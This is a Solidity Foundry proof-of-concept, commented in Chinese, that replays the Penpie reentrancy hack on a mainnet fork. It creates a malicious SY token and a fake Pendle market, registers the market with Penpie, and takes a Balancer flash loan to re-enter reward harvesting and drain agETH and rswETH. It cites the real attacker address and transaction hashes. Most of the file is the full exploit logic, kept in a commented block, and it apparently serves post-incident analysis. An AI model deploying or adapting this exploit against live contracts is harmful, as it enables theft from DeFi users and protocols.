// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "forge-std/Test.sol";
import "contracts/Exploiter.sol";

contract Replay is Test {
    Exploiter exploiter;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETHEREUM_RPC"), 20671878 - 1);
        vm.label(agETH, "agETH");
        vm.label(balancerVault, "balancerVault");
        vm.label(rswETH, "rswETH");
        vm.label(PENDLE_Market_AgETH, "PENDLE_Market_AgETH");
        vm.label(PENDLE_Market_rswETH, "PENDLE_Market_rswETH");
        vm.label(PendleRouterV4, "PendleRouterV4");
        vm.label(PendleYieldContractFactory, "PendleYieldContractFactory");
        vm.label(PendleMarketFactoryV3, "PendleMarketFactoryV3");
        vm.label(Penpie_MasterPenpie, "Penpie_MasterPenpie");
        vm.label(Penpie_PendleMarketRegisterHelper, "Penpie_PendleMarketRegisterHelper");
        vm.label(Penpie_PendleMarketDepositHelper_0x1c1f, "Penpie_PendleMarketDepositHelper_0x1c1f");
        vm.label(PenpieStaking_0x6e79, "PenpieStaking_0x6e79");
    }

    // EOA: 0x7A2f4D625Fb21F5e51562cE8Dc2E722e12A61d1B
    function testPoc_A() public {
        // 创建Exploiter(恶意SY合约)
        exploiter = new Exploiter();
        // 调用exploiter 创建恶意Market tx: 0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1 blockNum: 20671878
        exploiter.createMarket();

        // To pass `if lastRewardBlock != block.number` in PendleMarketV3 contract
        // 这里要求创建market和attack发生在两笔tx中
        vm.roll(block.number + 1);


        // Attack tx: 0x42b2ec27c732100dd9037c76da415e10329ea41598de453bb0c0c9ea7ce0d8e5 blockNum: 206771892
        exploiter.attack();

        // 因为黑客的交易中间间隔了几十个块，这里会有0.001个ETH左右的误差
        console.log('Flash loan agETH:', exploiter.agETH_flash_bal());
        console.log('Flash loan rswETH:', exploiter.rswETH_flash_bal());
        console.log('Final balance in agETH:     ', IERC20(agETH).balanceOf(address(exploiter)));
        console.log('Final balance in rswETH:     ', IERC20(rswETH).balanceOf(address(exploiter)));
    }
}

// 用于攻击的恶意SY合约，其底层资产也是其合约本身(非通用做法，仅用于此次攻击行为)
abstract contract Asset is ERC20("", "") {
    function decimals() public pure override returns (uint8) {
        return 18;
    }
}

// contract exploiter is Asset {

//     address PENDLE_Market; // 我们根据恶意SY创建出来的pendle market

//     uint saved_bal;
//     uint saved_bal1;
//     uint saved_bal2;
//     uint saved_value;
//     uint claimRewardsCall;


//     function assetInfo() external view returns (uint8, address, uint8) {
//         return(0, address(this), 8);
//     }

//     // Pendle 创建新的Market时使用
//     function exchangeRate() public pure returns (uint) {
//         return 1 ether;
//     }

//     function getRewardTokens() external view returns (address[] memory tokens) {
//         if (PENDLE_Market == msg.sender) {
//             tokens = new address[](2);
//             tokens[0] = PENDLE_Market_AgETH;
//             tokens[1] = PENDLE_Market_rswETH;
//             return tokens;
//         }
//     }

//     function rewardIndexesCurrent() external returns (uint[] memory) {}

//     function claimRewards(address user) external returns (uint256[] memory rewardAmounts) {

//         // 第一次进入此函数，在prepare阶段，用于准备market
//         if (claimRewardsCall == 0) {
//             claimRewardsCall++;
//             return new uint256[](0);
//         }

//         // 非第一次进入此函数，即在attack阶段进入此函数，执行此操作
//         if (claimRewardsCall == 1) {

//             // 将 agETH 包装为 Pendle协议的 agETHSY，并将其存入到对应的Pendle Market中以换取LP代币
//             IERC20(agETH).approve(PendleRouterV4, type(uint256).max);
//             uint256 bal_agETH = IERC20(agETH).balanceOf(address(this));
//             {
//                 Interfaces.SwapData memory swapData = Interfaces.SwapData(
//                     Interfaces.SwapType.NONE,// SwapType swapType;
//                     address(0),// address extRouter;
//                     "",// bytes extCalldata;
//                     false// bool needScale;
//                 );
//                 Interfaces.TokenInput memory input = Interfaces.TokenInput(
//                     agETH,// address tokenIn;
//                     bal_agETH,// uint256 netTokenIn;
//                     agETH,// address tokenMintSy;
//                     address(0),// address pendleSwap;
//                     swapData
//                 );
//                 Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(
//                     address(this), // address receiver,
//                     PENDLE_Market_AgETH, // address market,
//                     1, // uint256 minLpOut,
//                     1, // uint256 minYtOut,
//                     input // TokenInput calldata input
//                 );
//             }
//             saved_bal = IERC20(PENDLE_Market_AgETH).balanceOf(address(this));
//             IERC20(PENDLE_Market_AgETH).approve(PenpieStaking_0x6e79, saved_bal);
//             Interfaces(Penpie_PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_Market_AgETH, saved_bal);



//             // 将 rswETH 包装为 Pendle协议的 rswETHSY，并将其存入到对应的Pendle Market中以换取LP代币
//             IERC20(rswETH).approve(PendleRouterV4, type(uint256).max);
//             uint256 bal_rswETH = IERC20(rswETH).balanceOf(address(this));
//             {
//                 Interfaces.SwapData memory swapData = Interfaces.SwapData(
//                     Interfaces.SwapType.NONE,// SwapType swapType;
//                     address(0),// address extRouter;
//                     "",// bytes extCalldata;
//                     false// bool needScale;
//                 );
//                 Interfaces.TokenInput memory input = Interfaces.TokenInput(
//                     rswETH,// address tokenIn;
//                     bal_rswETH,// uint256 netTokenIn;
//                     rswETH,// address tokenMintSy;
//                     address(0),// address pendleSwap;
//                     swapData
//                 );
//                 (saved_value,,,) = Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(
//                     address(this), // address receiver,
//                     PENDLE_Market_rswETH, // address market,
//                     1, // uint256 minLpOut,
//                     1, // uint256 minYtOut,
//                     input // TokenInput calldata input
//                 );
//             }
//             uint256 bal_PENDLE_Market_rswETH_this = IERC20(PENDLE_Market_rswETH).balanceOf(address(this));
//             IERC20(PENDLE_Market_rswETH).approve(PenpieStaking_0x6e79, bal_PENDLE_Market_rswETH_this);
//             Interfaces(Penpie_PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_Market_rswETH, bal_PENDLE_Market_rswETH_this);


//             console.log("claimRewards finished!");
//         }
//     }

//     // https://etherscan.io/tx/0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1#eventlog
//     function createMarket() external {

//         // 以本合约为SY，创建出对应的 PT 和 YT代币
//         (address PT, address YT) =
//             Interfaces(PendleYieldContractFactory).createYieldContract(
//                 address(this),
//                 1735171200, // expiry, get from the event log
//                 true
//             );

//         // 根据 PT 创建对应的 Market
//         PENDLE_Market = Interfaces(PendleMarketFactoryV3).createNewMarket(
//             PT,
//             23352202321000000000, // scalarRoot, get from the event log
//             1032480618000000000, // initialAnchor, get from the event log
//             1998002662000000 // lnFeeRateRoot, get from the event log
//         );

//         // 向Penpie注册这个market
//         Interfaces(Penpie_PendleMarketRegisterHelper).registerPenpiePool(PENDLE_Market);

//         // 给YT地址 mint SY
//         _mint(address(YT), 1 ether);
//         // YT接收 SY 并 mint PT and YT
//         Interfaces(YT).mintPY(address(this), address(this));
//         // 把PT都发送到Market，并向market mint 1 ether SY，此时有了铸造LP代币的条件(PT + SY)
//         IERC20(PT).transfer(PENDLE_Market, IERC20(PT).balanceOf(address(this)));
//         _mint(PENDLE_Market, exchangeRate());

//         // 铸造LP代币
//         Interfaces(PENDLE_Market).mint(
//             address(this), // receiver
//             1 ether, // SY amount
//             1 ether // PT amount
//         );

//         // 最后，将LP代币存入Penpie的池子，获得Penpie取款凭证PRT代币
//         IERC20(PENDLE_Market).approve(PenpieStaking_0x6e79, type(uint256).max);
//         Interfaces(Penpie_PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_Market, IERC20(PENDLE_Market).balanceOf(address(this)));
//     }


//     function attack() external {
//         address[] memory tokens = new address[](2);
//         tokens[0] = agETH;
//         tokens[1] = rswETH;

//         // 记录贷款数量，方便还款
//         uint[] memory amounts = new uint[](2);
//         saved_bal1 = IERC20(agETH).balanceOf(balancerVault);
//         console.log("Flash loan agETH:           ", saved_bal1);
//         amounts[0] = saved_bal1;
//         saved_bal2 = IERC20(rswETH).balanceOf(balancerVault);
//         console.log("Flash loan rswETH:           ", saved_bal2);
//         amounts[1] = saved_bal2;

//         // attack
//         Interfaces(balancerVault).flashLoan(address(this), tokens, amounts, '');
//     }

//     function receiveFlashLoan(
//         address[] memory tokens,
//         uint256[] memory amounts,
//         uint256[] memory feeAmounts,
//         bytes memory userData
//     ) external {
//         address[] memory _markets = new address[](1);
//         _markets[0] = PENDLE_Market;

//         // 重入攻击，使用存款凭证批量收集指定市场的奖励
//         Interfaces(PenpieStaking_0x6e79).batchHarvestMarketRewards(
//             _markets,
//             0
//         );


//         // 到这里攻击已经完成
//         // 下面是从我们创建的market中撤回资金的过程



//         // 从我们创造出来的market claim资金
//         Interfaces(Penpie_MasterPenpie).multiclaim(_markets);

//         // 接下来withdraw燃烧掉LP代币，换回闪电贷的资金
//         Interfaces(Penpie_PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_Market_AgETH, saved_bal);
//         uint256 bal_this = IERC20(PENDLE_Market_AgETH).balanceOf(address(this));
//         IERC20(PENDLE_Market_AgETH).approve(PendleRouterV4, bal_this);
//         {
//             Interfaces.LimitOrderData memory limit = Interfaces.LimitOrderData(address(0), 0, new Interfaces.FillOrderParams[](0), new Interfaces.FillOrderParams[](0), '');
//             Interfaces.SwapData memory swapData = Interfaces.SwapData(Interfaces.SwapType.NONE, address(0), "", false);
//             Interfaces.TokenOutput memory output = Interfaces.TokenOutput(agETH, 0, agETH, address(0), swapData);
//             Interfaces(PendleRouterV4).removeLiquiditySingleToken(address(this), PENDLE_Market_AgETH, bal_this, output, limit);
//         }

//         Interfaces(Penpie_PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_Market_rswETH, saved_value);
//         uint256 bal_PENDLE_Market_rswETH = IERC20(PENDLE_Market_rswETH).balanceOf(address(this));
//         IERC20(PENDLE_Market_rswETH).approve(PendleRouterV4, bal_PENDLE_Market_rswETH);
//         {
//             Interfaces.LimitOrderData memory limit = Interfaces.LimitOrderData(address(0), 0, new Interfaces.FillOrderParams[](0), new Interfaces.FillOrderParams[](0), '');
//             Interfaces.SwapData memory swapData = Interfaces.SwapData(Interfaces.SwapType.NONE, address(0), "", false);
//             Interfaces.TokenOutput memory output = Interfaces.TokenOutput(rswETH, 0, rswETH, address(0), swapData);
//             Interfaces(PendleRouterV4).removeLiquiditySingleToken(address(this), PENDLE_Market_rswETH, bal_PENDLE_Market_rswETH, output, limit);
//         }



//         // 闪电贷还款
//         IERC20(agETH).balanceOf(address(this));
//         IERC20(agETH).transfer(balancerVault, saved_bal1);
//         IERC20(rswETH).balanceOf(address(this));
//         IERC20(rswETH).transfer(balancerVault, saved_bal2);
//     }
// }
